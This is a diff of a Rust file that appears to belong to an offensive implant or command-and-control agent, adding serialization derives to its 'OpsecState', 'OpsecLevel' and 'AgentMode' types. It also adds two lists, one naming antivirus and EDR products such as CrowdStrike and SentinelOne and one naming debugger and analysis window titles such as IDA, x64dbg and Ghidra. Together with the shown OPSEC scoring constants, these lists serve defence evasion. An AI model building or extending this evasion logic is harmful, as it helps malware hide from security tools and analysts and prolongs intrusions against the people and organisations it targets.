@@ -4,9 +4,26 @@ use std::sync::Mutex;
 use chrono::Timelike;
 use once_cell::sync::Lazy;
 use serde::{Serialize, Deserialize};
+use bincode::{Encode, Decode};
 use crate::state::MEMORY_PROTECTOR;
 use crate::high_threat_tools::{HIGH_THREAT_ANALYSIS_TOOLS};
 use zeroize::Zeroize;
+
+// Add missing constants that are referenced in code
+const COMMON_AV_EDR_PROCESSES: &[&str] = &[
+    "mcafee", "symantec", "norton", "kaspersky", "bitdefender", "avast", "avg",
+    "windows defender", "defender", "crowdstrike", "sentinelone", "carbonblack",
+    "cylance", "sophos", "trendmicro", "eset", "malwarebytes", "webroot",
+    "endgame", "fireeye", "paloalto", "cybereason", "tanium"
+];
+
+const SUSPICIOUS_WINDOW_TITLES: &[&str] = &[
+    "ida", "ollydbg", "x64dbg", "x32dbg", "immunity", "windbg", "ghidra",
+    "wireshark", "fiddler", "burp suite", "process monitor", "process explorer",
+    "regshot", "autoruns", "sysinternals", "volatility", "hex editor",
+    "cheat engine", "dnspy", "reflector", "dotpeek", "resource hacker",
+    "pe explorer", "cff explorer", "pestudio", "exeinfo", "detect it easy"
+];
 
 // --- OPSEC Scoring Constants ---
 const SCORE_DECAY_FACTOR: f32 = 0.85; // Changed from 0.95 for faster testing
@@ -44,7 +61,7 @@ const BUSINESS_HOURS_MODIFIER: f32 = 10.0;          // Increase thresholds durin
 const USER_ACTIVE_MODIFIER: f32 = 8.0;              // Increase thresholds when user active
 const HIGH_THREAT_MODIFIER: f32 = 15.0;             // Increase thresholds when threats detected
 
-#[derive(Debug, Clone, Copy, PartialEq, Serialize, Deserialize)]
+#[derive(Debug, Clone, Copy, PartialEq, Serialize, Deserialize, Encode, Decode)] // Add Encode, Decode
 pub struct OpsecState {
     pub mode: AgentMode,
     pub current_score: f32,
@@ -85,13 +102,13 @@ impl Zeroize for OpsecState {
     }
 }
 
-#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Encode, Decode)] // Add Encode, Decode
 pub enum OpsecLevel {
     High,
     Low,
 }
 
-#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Encode, Decode)] // Add Encode, Decode
 pub enum AgentMode {
     FullOpsec,
     ReducedActivity,
